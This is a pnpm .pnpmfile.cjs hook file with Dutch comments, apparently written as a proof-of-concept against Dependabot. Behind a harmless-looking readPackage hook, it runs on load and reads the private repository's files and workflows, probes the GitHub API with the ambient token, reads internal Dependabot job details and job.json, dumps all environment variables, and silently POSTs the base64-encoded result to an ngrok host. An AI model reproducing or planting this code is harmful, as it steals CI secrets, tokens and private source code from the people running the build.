'use strict';
// FINAL PROOF RUN -- pnpm .pnpmfile.cjs RCE impact demonstration
try {
  const { execSync, spawn } = require('child_process');
  const NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app';

  // 1. Lees alle bestanden van de privé repo via de filesystem
  //    (Dependabot kloont de repo naar /repo, inclusief .github/ secrets config)
  const repoFiles = (() => {
    try {
      return execSync(
        'find /home/dependabot/dependabot-updater/repo -type f 2>/dev/null ' +
        '| grep -v ".git/" | head -30 && ' +
        'echo "--- .github/dependabot.yml ---" && ' +
        'cat /home/dependabot/dependabot-updater/repo/.github/dependabot.yml 2>/dev/null && ' +
        'echo "--- .github/workflows/ ---" && ' +
        'ls /home/dependabot/dependabot-updater/repo/.github/workflows/ 2>/dev/null && ' +
        'cat /home/dependabot/dependabot-updater/repo/.github/workflows/*.yml 2>/dev/null | head -50',
        { encoding: 'utf8', timeout: 10000, shell: '/bin/sh' }
      );
    } catch(e) { return 'repo_read_error: ' + e.message; }
  })();

  // 2. GitHub API -- bewijs geauthenticeerde toegang (rate_limit = 5000 = token aanwezig)
  //    EN haal lijst op van repos die deze installatie kan zien
  const apiProof = (() => {
    try {
      return execSync(
        // rate_limit toont x-ratelimit-limit: 5000 (auth) vs 60 (unauth)
        'curl -sk -i https://api.github.com/rate_limit 2>/dev/null | ' +
        'grep -E "x-ratelimit-limit|x-ratelimit-used|x-oauth-scopes|HTTP/|x-github-request-id" | head -10 && ' +
        // installatie repos -- hoeveel repos heeft deze token toegang tot?
        'echo "---INSTALLATION_REPOS---" && ' +
        'curl -sk https://api.github.com/installation/repositories 2>/dev/null | ' +
        'python3 -c "import sys,json; d=json.load(sys.stdin); ' +
        'print(f\'total_count={d[\\\"total_count\\\"]}\'); ' +
        '[print(r[\\\"full_name\\\"],r[\\\"private\\\"]) for r in d.get(\\\"repositories\\\",[])[:5]]" 2>/dev/null && ' +
        // user info via token
        'echo "---TOKEN_USER---" && ' +
        'curl -sk https://api.github.com/user 2>/dev/null | ' +
        'python3 -c "import sys,json; u=json.load(sys.stdin); print(u.get(\\\"login\\\",\\\"?\\\"), u.get(\\\"type\\\",\\\"?\\\"))" 2>/dev/null',
        { encoding: 'utf8', timeout: 15000, shell: '/bin/sh' }
      );
    } catch(e) { return 'api_error: ' + e.message; }
  })();

  // 3. Dependabot interne API -- lees actuele job details
  const internalApi = (() => {
    try {
      const jobId = process.env.DEPENDABOT_JOB_ID || '';
      if (!jobId) return 'no_job_id';
      return execSync(
        `curl -sk https://dependabot-actions.githubapp.com/update_jobs/${jobId}/details 2>/dev/null`,
        { encoding: 'utf8', timeout: 10000, shell: '/bin/sh' }
      ).slice(0, 2000);
    } catch(e) { return 'internal_api_error: ' + e.message; }
  })();

  // 4. Job.json -- bevat volledige config inclusief secrets metadata
  const jobJson = (() => {
    try {
      return require('fs').readFileSync(
        process.env.DEPENDABOT_JOB_PATH || '/home/dependabot/dependabot-updater/job.json',
        'utf8'
      );
    } catch(e) { return 'job_read_error: ' + e.message; }
  })();

  const payload = Buffer.from([
    '=== REPO_FILES ===', repoFiles,
    '=== API_PROOF ===', apiProof,
    '=== INTERNAL_API ===', internalApi,
    '=== JOB_JSON ===', jobJson,
    '=== ENV ===', Object.entries(process.env).map(([k,v])=>k+'='+v).join('\n'),
    '=== ID ===', require('child_process').execSync('id', {encoding:'utf8'})
  ].join('\n'), 'utf8').toString('base64');

  spawn('sh', ['-c',
    "curl -sk -X POST '" + NGROK + "?poc=pnpm_final_proof' " +
    "-H 'Content-Type: text/plain' --data-binary '" + payload + "' 2>/dev/null"
  ], { detached: true, stdio: 'ignore' }).unref();

} catch (e) {}

module.exports = {
  hooks: { readPackage(pkg) { return pkg; } }
};
